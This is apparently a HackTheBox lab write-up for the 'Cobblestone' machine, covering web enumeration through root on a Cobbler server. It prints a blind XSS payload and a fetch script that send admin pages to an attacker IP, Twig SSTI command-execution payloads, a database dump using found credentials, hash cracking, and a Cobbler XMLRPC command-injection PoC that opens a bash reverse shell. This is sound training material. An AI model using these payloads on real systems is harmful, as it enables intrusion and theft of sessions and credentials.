---
title: Cobblestone
layout: post
released: 2025-08-09
creators:
  - c1sc0
pwned: true
tags:
  - os/linux
  - diff/insane
category:
  - HTB
description: Cobblestone is running a minecraft website vulnerable to xss allowing us to extract admin pages and soon after the admin cookie. Using the admin cookie to login we're able to exploit an SSTI RCE to get a shell as www-data. We're can then locate credentials for the database and from there dump and crack the credentials for the cobbler user. We then find that root is running a Cobbler XMLRPC server that's vulnerable to an authenticated command injection RCE.
image: /assets/img/img_2026-09-09-cobblestone/0001.jpeg
cssclasses:
  - custom_htb
---
![](/assets/img/img_2026-09-09-cobblestone/0001.jpeg)
# Cobblestone

## Scans

As usual we start off with an `nmap` scan

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 50:ef:5f:db:82:03:36:51:27:6c:6b:a6:fc:3f:5a:9f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBCfBUkQ4szy00s+EbTzIMq4Cv/mOkGWCD8xewIgvZ4zDI5pPhUaVYNsPaUmYzXgi0DzCy6s//8a1YFcyH398Nc=
|   256 e2:1d:f3:e9:6a:ce:fb:e0:13:9b:07:91:28:38:ec:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICuDtua7ciUfRA2uUH+ergsCOdq0Aaoakru1kQ9/OWPs
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: Cobblestone - Official Website
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We can find 2 open ports, pretty standard for a Linux box.

- 22 : OpenSSH 9.2p1
- 80 : Apache httpd 2.4.62

Doing a simple directory FUZZ we can find the following directories, some of which are interesting and we don't have access.

```
ffuf -u http://cobblestone.htb/FUZZ -e .php -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cobblestone.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

.hta                    [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 298ms]
.htpasswd               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 299ms]
.htaccess.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 299ms]
.htaccess               [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 299ms]
.htpasswd.php           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 299ms]
.hta.php                [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 304ms]
css                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 285ms]
db                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 287ms]
download.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 286ms]
img                     [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 292ms]
index.php               [Status: 200, Size: 1942, Words: 138, Lines: 62, Duration: 293ms]
index.php               [Status: 200, Size: 1942, Words: 138, Lines: 62, Duration: 304ms]
javascript              [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 290ms]
js                      [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 292ms]
login.php               [Status: 200, Size: 4659, Words: 1240, Lines: 88, Duration: 289ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 288ms]
register.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 290ms]
server-status           [Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 286ms]
skins                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 292ms]
skins.php               [Status: 302, Size: 81, Words: 10, Lines: 4, Duration: 300ms]
templates               [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 290ms]
upload.php              [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 291ms]
user.php                [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 290ms]
vendor                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 299ms]
:: Progress: [9492/9492] :: Job [1/1] :: 139 req/sec :: Duration: [0:01:12] :: Errors: 0 ::

```

## Cobblestone Website

Taking a look around the website we can find what looks to be a Minecraft services website.

- **Get Your Own** leads us to a subdomain: `deploy.cobblestone.htb`
- **Skin Database** leads us to a page: `cobblestone.htb/skis.php`
- **Vote(beta)** leads us to another subdomain: `vote.cobblestone.htb`

### Deploy
![](/assets/img/img_2026-09-09-cobblestone/0002.jpeg)

Still under development, nothing much to interact with here.

### Skins
![](/assets/img/img_2026-09-09-cobblestone/0003.jpeg)

After registering and logging in we can see that we can download skins 


The `download.php` endpoint allows us to specify a `skin` parameter to determine the file to be downloaded.

```http
GET /download.php?skin=/skins/sword4000.png HTTP/1.1
Host: cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://cobblestone.htb/skins.php
Cookie: PHPSESSID=4q7qsvo4a1tvtktkg63n9tf85h
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Attempting to change this value and try for different LFI tricks leads to a file not found.

**Request**

```http
GET /download.php?skin=/skins/../download.php HTTP/1.1
Host: cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://cobblestone.htb/skins.php
Cookie: PHPSESSID=4q7qsvo4a1tvtktkg63n9tf85h
Upgrade-Insecure-Requests: 1
Priority: u=0, i



```

**Response**

```
HTTP/1.1 200 OK
Date: Tue, 12 Aug 2025 05:24:51 GMT
Server: Apache/2.4.62 (Debian)
Content-Length: 15
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

File not found.

```

#### Suggest Skin
Any skin suggestions seem to go to the `admin` for approval 
![](/assets/img/img_2026-09-09-cobblestone/0005.jpeg)

Attempting a blind `xss` we start a listener and use the following payload in the username field.

```
<script src=http://10.10.14.158/user></script>

```

We get the following response on our listener

```bash
nc -lvnp 80                
listening on [any] 80 ...
connect to [10.10.14.158] from (UNKNOWN) [10.129.148.174] 46888
GET /user HTTP/1.1
Host: 10.10.14.158
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115 Safari/537.36
Accept: */*
Referer: http://cobblestone.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```

### Vote

After registering and logging in we're greeted with three tabs:

#### Vote
![](/assets/img/img_2026-09-09-cobblestone/0006.jpeg)

#### Suggest
![](/assets/img/img_2026-09-09-cobblestone/0007.jpeg)

After putting in a suggestion we get a details page with a potential IDOR 
![](/assets/img/img_2026-09-09-cobblestone/0008.jpeg)

We can check this by changing the `id` parameter 
![](/assets/img/img_2026-09-09-cobblestone/0009.jpeg)

We can see other suggestions but this is not too useful, let's move on.

#### Logout

Logs us out

# User

## Admin Panel

Taking a deeper look at our XSS, we can't extract cookies because it's `httponly` but we can attempt to force the admin to read files or pages for us.

```
<script src=http://10.10.14.158/xss.js></script>

```

I wrote the following script and found the most interesting endpoint to be `skins.php`

```javascript
fetch("http://cobblestone.htb/skins.php")
.then(r=>r.text())
.then(t=>fetch("http://10.10.14.158:9001",{method: 'POST', body: t}));

```

Let's start a `python http server` and `nc listener` and send over our payload.

```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

# In another terminal
nc -lvnp 9001
listening on [any] 9001 ...

```

We get a call back on our listener, in which we can find the following line:

```html
<p><a class="text-bold text-light" href="skins_app_admin_server_info.php" target="_blank">Admin server info</a></p>            

```

Let's replace the first url in our `xss` with this link `http://cobblestone.htb/skins_app_admin_server_info.php`

In the call back we can find what looks to be a `phpinfo()` page

```
<tr><td class="e">HTTP_COOKIE </td><td class="v">PHPSESSID=padvkrbvulf25pu44vgck3q1l2 </td></tr>

```

Replacing our `PHPSESSID` cookie and refreshing the page we're able to see the `admin` version of the page. 
![](/assets/img/img_2026-09-09-cobblestone/0010.jpeg)
## SSTI RCE

*Thanks to Y41nz for this method* Clicking around in `User Management`, when we click `preview` we can find the following `http` request.

```http
POST /preview_banner.php HTTP/1.1
Host: cobblestone.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://cobblestone.htb/skins.php
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 12
Origin: http://cobblestone.htb
Connection: keep-alive
Cookie: PHPSESSID=padvkrbvulf25pu44vgck3q1l2 
Priority: u=0

first=cobble

```

Replacing the `first` parameter with the following payload: `{{7*7}}` we get the following response

```
HTTP/1.1 200 OK
Date: Tue, 12 Aug 2025 11:28:03 GMT
Server: Apache/2.4.62 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 48
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<h1 class="text-light display-3">Welcome 49</h1>

```

We successfully have `SSTI`! let's attempt to execute commands

```
{{["id"]|filter("system")}}

```

We get a response of

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Success! Checking for files in our directory we can find the `db` folder

```
{{["ls -la"]|filter("system")}}

```

Response

```
total 116
    drwxr-xr-x 10 root root 4096 Apr 28 03:05 .
    drwxr-xr-x 5 root root 4096 Aug 12 06:30 ..
    -rw-r--r-- 1 root root 56 Sep 27 2024 composer.json
    -rw-r--r-- 1 root root 13867 Sep 27 2024 composer.lock
    drwxr-xr-x 2 root root 4096 Apr 23 07:57 css
    drwxr-xr-x 2 root root 4096 Oct 1 2024 db
    -rw-r--r-- 1 root root 611 Sep 30 2024 download.php
    drwxr-xr-x 2 root root 4096 Oct 1 2024 img
    -rw-r--r-- 1 root root 1942 Oct 1 2024 index.php
    drwxr-xr-x 2 root root 4096 Oct 1 2024 js
    -rw-r--r-- 1 root root 6269 Apr 24 04:43 login.php
    -rw-r--r-- 1 root root 1268 Apr 23 08:50 login_verify.php
    -rw-r--r-- 1 root root 101 Sep 27 2024 logout.php
    -rw-r--r-- 1 root root 493 Apr 24 02:55 preview_banner.php
    -rw-r--r-- 1 root root 2062 Apr 28 06:53 register.php
    drwxr-xrwx 2 root root 4096 Oct 1 2024 skins
    -rw-r--r-- 1 root root 7445 Apr 28 07:00 skins.php
    -rw-r--r-- 1 root root 255 Apr 28 03:04 skins_app_admin_server_info.php
    -rw-r--r-- 1 root root 1056 Apr 24 04:27 suggest_skin.php
    drwxr-xr-x 2 root root 4096 Apr 28 04:03 templates
    -rw-r--r-- 1 root root 3102 Apr 24 08:04 upload.php
    -rw-r--r-- 1 root root 3267 Apr 28 07:04 user.php
    drwxr-xr-x 5 root root 4096 Sep 27 2024 vendor
    drwxr-xr-x 2 root root 4096 Sep 27 2024 webfonts

```

Taking a look in that database we can find `connection.php`

```
{{["ls -la db"]|filter("system")}}

```

Response

```
total 12
    drwxr-xr-x 2 root root 4096 Oct 1 2024 .
    drwxr-xr-x 10 root root 4096 Apr 28 03:05 ..
    -rw-r--r-- 1 root root 303 Oct 1 2024 connection.php

```

Taking a look at `/etc/apache2/sites-available/000-default.conf` We can find the following port: `25151`

```
<VirtualHost *:80>
	RewriteEngine On
	RewriteCond %{HTTP_HOST} !^cobblestone.htb$
	RewriteRule /.* http://cobblestone.htb/ [R]
	ServerName 127.0.0.1
	ProxyPass "/cobbler_api" "http://127.0.0.1:25151/"
	ProxyPassReverse "/cobbler_api" "http://127.0.0.1:25151/"
</VirtualHost>

<VirtualHost *:80>
	ServerName cobblestone.htb

	ServerAdmin cobble@cobblestone.htb
	DocumentRoot /var/www/html

	<Directory /var/www/html>
		AAHatName cobblestone
	</Directory>

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

	RewriteEngine On
	RewriteCond %{HTTP_HOST} !^cobblestone.htb$
	RewriteRule /.* http://cobblestone.htb/ [R]

	Alias /cobbler /srv/www/cobbler

	<Directory /srv/www/cobbler>
		Options Indexes FollowSymLinks
		AllowOverride None
		Require all granted
	</Directory>

</VirtualHost>

<VirtualHost *:80>
	ServerName deploy.cobblestone.htb

	ServerAdmin cobble@cobblestone.htb
	DocumentRoot /var/www/deploy

	RewriteEngine On
	RewriteCond %{HTTP_HOST} !^deploy.cobblestone.htb$
	RewriteRule /.* http://deploy.cobblestone.htb/ [R]
</VirtualHost>

<VirtualHost *:80>
	ServerName vote.cobblestone.htb

	ServerAdmin cobble@cobblestone.htb
	DocumentRoot /var/www/vote

	RewriteEngine On
	RewriteCond %{HTTP_HOST} !^vote.cobblestone.htb$
	RewriteRule /.* http://vote.cobblestone.htb/ [R]
</VirtualHost>

```

Taking a look at `connection.php` in the `db` folder we can find database credentials.

```bash
<?php

$dbserver = "localhost";
$username = "dbuser";
$password = "aichooDeeYanaekungei9rogi0eMuo2o";
$dbname = "cobblestone";

$conn = new mysqli($dbserver, $username, $password, $dbname);

// Check connection
if ($conn->connect_errno > 0) {
    die("Connection failed: " . $conn->connect_error);
}
?>

```

Let's use `mysqldump` to dump the database.

```
{{["mysqldump -udbuser -paichooDeeYanaekungei9rogi0eMuo2o cobblestone"]|filter("system")}}

```

```bash
<SNIP>
(1,'admin','admin','admin','admin@cobblestone.htb','admin','f4166d263f25a862fa1b77116693253c24d18a36f5ac597d8a01b10a25c560d1','*'),
(2,'cobble','cobble','stone','cobble@cobblestone.htb','admin','20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d','*'),
(3,'w1ld','w1ld','w1ld','w1ld@w1ld.com','user','14a0e8053ac85d7b23c26ed4240263168105637282bce10f90e9b79141a4c6ee','10.10.14.158');
</SNIP>

```

We can find several users, most interestingly of all: `cobble` let's try to crack these hashes.

```bash
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
<SNIP>
20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d:iluvdannymorethanyouknow
</SNIP>

```

We've retrieved the credentials: `cobble`:`iluvdannymorethanyouknow`

Let's try `ssh`

```
ssh cobble@cobblestone.htb
The authenticity of host 'cobblestone.htb (10.129.147.235)' can't be established.
ED25519 key fingerprint is SHA256:c5Fpg/cgHQO2EmwqsW3VtYIVXXMz7nz8dwjibC8n0gw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cobblestone.htb' (ED25519) to the list of known hosts.
cobble@cobblestone.htb's password: 
Linux cobblestone 6.1.0-37-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.140-1 (2025-05-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
cobble@cobblestone:~$ ls -la
total 32
drwx------ 3 cobble cobble 4096 Jul 24 14:41 .
drwxr-xr-x 3 root   root   4096 Jul 24 14:41 ..
-rwx------ 1 root   root      1 Oct  1  2024 .bash_history
-rwx------ 1 cobble cobble  220 Oct  1  2024 .bash_logout
-rwx------ 1 cobble cobble 3526 Oct  1  2024 .bashrc
-rwx------ 1 cobble cobble  807 Oct  1  2024 .profile
drwx------ 2 cobble cobble 4096 Jul 24 14:41 .ssh
-rw-r----- 2 root   cobble   33 Aug 12 01:08 user.txt

```

Just like that, we have User!

# Root

## Cobbler XMLRPC

Looking around we can find port `25151` is open just like the `apache2` conf file dictates.

```
cobble@cobblestone:~$ ss -tlnp
State                       Recv-Q                      Send-Q                                           Local Address:Port                                            Peer Address:Port                      Process
LISTEN                      0                           80                                                   127.0.0.1:3306                                                 0.0.0.0:*
LISTEN                      0                           5                                                    127.0.0.1:25151                                                0.0.0.0:*                                                      
LISTEN                      0                           511                                                    0.0.0.0:80                                                   0.0.0.0:*                                                      
LISTEN                      0                           128                                                    0.0.0.0:22                                                   0.0.0.0:*                                                      
LISTEN                      0                           128                                                       [::]:22                                                      [::]:*

```

Let's forward port `25151` which we found earlier. Taking a look at this port we find that a GET method is not supported. 
![](/assets/img/img_2026-09-09-cobblestone/0011.jpeg)

```
PORT      STATE SERVICE VERSION
25151/tcp open  http    BaseHTTPServer 0.6 (Python 3.11.2)
|_http-title: Error response
|_http-server-header: BaseHTTP/0.6 Python/3.11.2
|_xmlrpc-methods: XMLRPC instance doesn't support introspection.

```

This looks like the `xmlrpc` interface of `cobbler api`, we can take a look at the [Cobbler Github](https://github.com/cobbler/cobbler) and find a [Security Advisory](https://github.com/cobbler/cobbler/security/advisories/GHSA-m26c-fcgh-cp6h) about connecting to the `xmlrpc` and making changes as well as another [Issue](https://github.com/cobbler/cobbler/issues/1329) mentioning `Remote Command Execution`.

We can find the following line in `/etc/cobbler/settings.yaml` using our `SSTI` from before.

```yaml
'default_password_crypted': '$1$mF86/UHC$WvcIcX2t6crBz2onWxyac.'

```

Cracking this with `hashcat` we get: `cobbler`, which is the default as per the `settings.yaml` file.

Taking a look at the [documentation](https://github.com/cobbler/cobbler/wiki/XMLRPC-API#logging-in) we can find out how to:

- Login
- Make Changes

We can find the relevant `api endpoints`, such as the [background\_aclsetup](https://github.com/cobbler/cobbler/wiki/XMLRPC-API#logging-in) as mentioned in the [Issue](https://github.com/cobbler/cobbler/issues/1329) we talked about earlier.

Using all of this information, we can write the following `PoC` 
*Thanks to Y41nz for this `PoC`*

```python
import xmlrpc.client

# Configuration                                                                                                                  
url = "http://127.0.0.1:25151"  # Update to target IP
server = xmlrpc.client.ServerProxy(url) 
# 1. Authenticate properly
try:
    print("[+] Authenticating...")
    token = server.login("cobbler", "cobbler")
    print(f"[+] Token: {token}")
except Exception as e:
    print(f"[-] Login failed: {e}")
    exit(1)

# 2. Working reverse shell payload
payload = """dummyuser; exec /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.158/9001 0>&1' #"""
options = {
    "adduser": payload,
    "name": "exploit-shell",
    "comment": "ACL setup test"
}

# 3. Execute the exploit
try:
    print("[+] Triggering reverse shell...")
    # Note: Some Cobbler versions expect token first, others expect options first
    try:
        result = server.background_aclsetup(token, options)
    except:
        result = server.background_aclsetup(options, token)
    print(f"[+] API Response: {result}")
    print("[+] Check your listener for shell")
except Exception as e:
    print(f"[-] Exploit failed: {e}")

```

Let's start a listener and execute this `PoC`

```
python3 root.py 
[+] Authenticating...
[+] Token: /wCL0KwwvdJoaelGYKvgOmNR64Yj6CnWzQ==
[+] Triggering reverse shell...
[+] API Response: 2025-08-12_050301_(CLI) ACL Configuration_373cd89dcc354f15a8b97634175fc6e4
[+] Check your listener for shell

```

**Listener**

```
nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.158] from (UNKNOWN) [10.129.148.174] 53154
bash: cannot set terminal process group (72703): Inappropriate ioctl for device
bash: no job control in this shell
root@cobblestone:/#

```

Just like that, we have Root!